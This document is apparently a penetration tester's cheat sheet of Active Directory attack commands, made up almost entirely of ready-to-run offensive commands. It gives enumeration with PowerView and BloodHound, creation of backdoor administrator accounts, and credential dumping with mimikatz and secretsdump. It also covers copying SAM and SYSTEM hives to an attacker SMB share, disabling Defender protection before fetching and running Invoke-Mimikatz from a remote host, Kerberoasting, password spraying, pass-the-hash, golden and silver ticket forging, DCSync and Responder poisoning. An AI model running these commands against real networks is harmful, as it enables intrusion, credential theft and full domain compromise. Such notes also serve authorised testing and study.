# Active Directory
## Enumeration
-> Enumerate all users in the entire domain
```powershell
net user /domain
```

-> Get information from a specific user
```powershell
net user <user> /domain
```

-> Enumerate all groups in the entire domain
```powershell
net group /domain
```

-> Get members of local group
```powershell
Get-NetLocalGroup -ComputerName <domain> -Recurse (PowerView)
```

-> Find out domain controller hostname
```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

-> Configure ActiveDirectory Module - RSAT
```powershell
curl https://raw.githubusercontent.com/samratashok/ADModule/master/ActiveDirectory/ActiveDirectory.psd1 -o ActiveDirectory.psd1  
curl https://github.com/samratashok/ADModule/blob/master/Microsoft.ActiveDirectory.Management.dll?raw=true -o Microsoft.ActiveDirectory.Management.dll  
Import-Module .\Microsoft.ActiveDirectory.Management.dll  
Import-Module .\ActiveDirectory.psd1  
```

-> Configure PowerView Module
```powershell
curl https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 -o PowerView.ps1
. .\PowerView.ps1
```
-> Last logon
```powershell
Get-LastLoggedOn -ComputerName <domain>
```

-> List Computers
```powershell
Get-NetComputer (PowerView)
```

-> Add domain user to a domain group
```powershell
Add-DomainGroupMember -Identity 'SQLManagers' -Members 'examed'
Get-NetGroupMember -GroupName 'SQLManagers'
```

-> Enumeration script for all AD users, along with all properties for those user accounts.
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="samAccountType=805306368"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
}
```

-> Enumerate logged users
```powershell
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName <computer_name>
```
- https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1

-> Enumerate all active sessions
```powershell
Get-NetSession -ComputerName dc1
```

#### Enumeration Through Service Principal Names
- https://raw.githubusercontent.com/compwiz32/PowerShell/master/Get-SPN.ps1

## Remote Access
### Remote Desktop Protocol - RDP
-> Create a user  
```powershell
net user <user> <password> /add
```

-> Add to local administrators group  
```powershell
net localgroup Administrators <user> /add
```

-> Add to group of users who can access via RDP
```powershell
net localgroup "Remote Management Users" <user> /add
net localgroup "Remote Desktop Users" <user> /add
```

-> Enable RDP
```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

-> move to another user  
```powershell
runas /user:<hostname>\<user> cmd
```

-> xfreerdp via RDP with sharing in \\\tsclient\share\
```bash
xfreerdp /u:user /p:pass /v:ip +clipboard /dynamic-resolution /cert:ignore /drive:/usr/share/windows-resources,share
```

-> rdesktop via RDP  
```bash
rdesktop -u <user> -p <password> -d <domain> -f <ip>
```

-> evil-winrm
```bash
evil-winrm -i <ip> -u <user> -p <password>
```

## Cached Credential Storage and Retrieval
-> Dump the credentials of all connected users, including cached hashes
```powershell
./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
-> Mix  
```powershell
./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
```

## Extracting hashes
### Intro
-> SAM - Security Account Manager (Store as user accounts)  %SystemRoot%/system32/config/sam  
-> NTDS.DIT (Windows Server / Active Directory - Store AD data including user accounts) %SystemRoot%/ntds/ntds.dit  
-> SYSTEM (System file to decrypt SAM/NTDS.DIT)  %SystemRoot%/system32/config/system  
-> Backup - Sistemas antigos como XP/2003: C:\Windows\repair\sam and C:\Windows\repair\system

### Get sam and system by registry (From old versions to recent versions)
```powershell
reg save hklm\sam sam
reg save hklm\system system
```

-> transfer sam and syste via sharing files via SMB
-> Configuring smb server pt1    
```bash
impacket-smbserver share . -smb2support -user user -password teste321
```
-> Configuring smb server pt2  
```powershell
net use \\<smbserver>\share /USER:user teste321
copy C:\Users\Backup\sam.hive \\<smbserver>\share\
copy C:\Users\Backup\system.hive \\<smbserver>\share\
```
- https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py

-> View smb enumeration  
```powershell
net view \\dc /all
net use * \\dc\c$
net use
```

### Volume shadow copy (Windows Server \ recent versions)
-> vssadmin  
```powershell
vssadmin create shadow /for=c:
```

-> meterpreter  
```bash
hashdump
```

-> samdump2 (Win 2k/NT/XP/Vista SAM)   
```bash
samdump2 system sam
```

-> impacket-secretsdump  
```bash
impacket-secretsdump -sam sam -system system LOCAL
```

### Extracting Hashes in Domain and Pivoting  
-> Dump the credentials of all connected users, including cached hashes
```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

-> mimikatz + ScriptBlock
```powershell
$sess = New-PSSession -ComputerName <hostname>
```
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
iex (iwr http://<ip>/Invoke-Mimikatz.ps1 -UseBasicParsing)
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```
or  
```powershell
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession $sess
Invoke-Mimikatz
```

### Extracting Hashes in cache
-> fgdump  
```powershell
fgdump.exe
```
/usr/share/windows-binaries/fgdump/fgdump.exe

-> meterpreter  
```powershell
load kiwi
creds_msv
```

-> wce-universal (Clear Text password)   
```powershell
wce-universal.exe -w
```
/usr/share/windows-resources/wce/wce-universal.exe 

-> mimikatz
```powershell
.\mimikatz.exe
sekurlsa::wdigest -a full  
sekurlsa::logonpasswords
```

-> mimikatz - meterpreter  
```powershell
load mimikatz  
wdigest
```

### Extracting Hashes (Remote)
```powershell
impacket-secretsdump user:password@IP
```

## Service Account Attacks
-> Sow user tickets that are stored in memory
```powershell
./mimikatz.exe "sekurlsa::tickets"
```

-> Display all cached Kerberos tickets for the current user
```powershell
klist
```

-> Export service tickets from memory
```powershell
./mimikatz.exe "kerberos::list /export"
```

-> Wordlist Attack with tgsrepcrack.py to get the clear text password for the service account
```powershell
sudo apt update && sudo apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <ticket.kirbi>
```

or  

- https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1

## Password Spraying
```powershell
.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
```
https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1

## Enumeration - BloodHound
-> Install - Attacker VM
```bash
sudo apt install bloodhound
```

-> neo4j start - http://localhost:7474/
```bash
sudo neo4j start
```

-> Enumeration - Windows
```powershell
iwr -uri <ip>/SharpHound.ps1 -Outfile SharpHound.ps1
. .\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All,loggedon
Invoke-BloodHound -CollectionMethod All -Verbose
Invoke-BloodHound -CollectionMethod LoggedOn -Verbose
```

## Access Validation 
-> Validation of network user credentials via smb using crackmmapexec  
```bash
crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> -d <domain> --continue-on-success
crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> -d <domain> 
crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> --local-auth --lsa  
crackmapexec smb 192.168.0.10-20 -u administrator -p <password>
```

-> Connect via smbclient
```bash
smbclient //ip -U <user> -L
```

-> smbmap
```bash
smbmap -H <ip> -u <user> 
```

-> See read permission of given user on smb shares
```bash
crackmapexec smb <IP> --shares -u <user> -p '<pass>'
```

## AS-REP Roasting Attack - not require Pre-Authentication
-> kerbrute - Enumeration Users
```bash
kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
```
- https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt

-> GetNPUsers.py - Query ASReproastable accounts from the KDC
```bash
impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
```

## Kerberoast
-> impacket-GetUserSPNs
```bash
impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
```
or  
```bash
impacket-GetUserSPNs -request -dc-ip <IP> -hashes <hash_machine_account>:<hash_machine_account> <domain>/<machine_name$> -outputfile hashes.kerberoast
```

```powershell
hashcat -a 0 -m 13100 ok.txt /usr/share/wordlists/rockyou.txt 
```
```powershell
.\PsExec.exe -u <domain>\<user> -p <password> cmd.exe
```
or  
```powershell
runas /user:<hostname>\<user> cmd.exe
```


## Active Directory Lateral Movement
### Pass the Hash
-> Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
```bash
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd
```

-> Remote Access - impacket-psexec  
```bash
impacket-psexec '<domain>/<user>'@<IP> -hashes ':<hash>'
impacket-psexec '<domain>/<user>'@<IP>
```

-> Remote Access + evil-winrm  
```bash
evil-winrm -i <IP> -u <user> -H <hash>
```

### Over Pass the Hash
-> Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user

```powershell
mimikatz.exe "sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe" "exit"
```

-> Command execution with psexec  
```powershell
.\PsExec.exe \\<hostname> cmd.exe
```

### Silver Ticket - Pass the Ticket
-> It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.

-> Get SID
```powershell
GetDomainsid (PowerView)
```
or  
```powershell
whoami /user
```
-> Get Machine Account Hash
```powershell
Invoke-Mimikatz '"lsadump::lsa /patch"' -ComputerName <hostname_dc>
```
-> Exploitation mimikatz.exe
```powershell
kerberos::purge
kerberos::list
kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /target:<hostname.domain> /service:HTTP /rc4:<ervice_account_password_hash> /ptt
```
or
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain> /sid:<domainsid> /target:<dc>.<domain> /service:HOST /rc4:<machine_account_hash> /user:Administrator /ptt"'
kerberos::list
```

### Golden Ticket - Pass the Ticket
-> It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.

-> Get hash krbtgt
```powershell
./mimikatz.exe "privilege::debug" "lsadump::lsa /patch"
```
-> Get SID
```powershell
GetDomainsid (PowerView)
```
or  
```powershell
whoami /user
```

-> Exploitation
```powershell
mimikatz.exe "kerberos::purge" "kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt" "misc::cmd"

psexec.exe \\dc1 cmd.exe
```

### DCSync Attack
-> The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
```powershell
./mimikatz.exe "lsadump::dcsync /user:Administrator"
```

### NetNTLM Authentication Exploits with SMB - LLMNR Poisoning - Capturing hash in responder
Responder allows you to perform Man-in-the-Middle attacks by poisoning responses during NetNTLM authentication, making the client talk to you instead of the real server it wants to connect to.
On a real lan network, the responder will attempt to poison all Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Server (NBT-NS), and Web Proxy Auto-Dscovery (WPAD) requests detected. NBT-NS is the precursor protocol to LLMNR.
```bash
responder -I eth0 -v
```
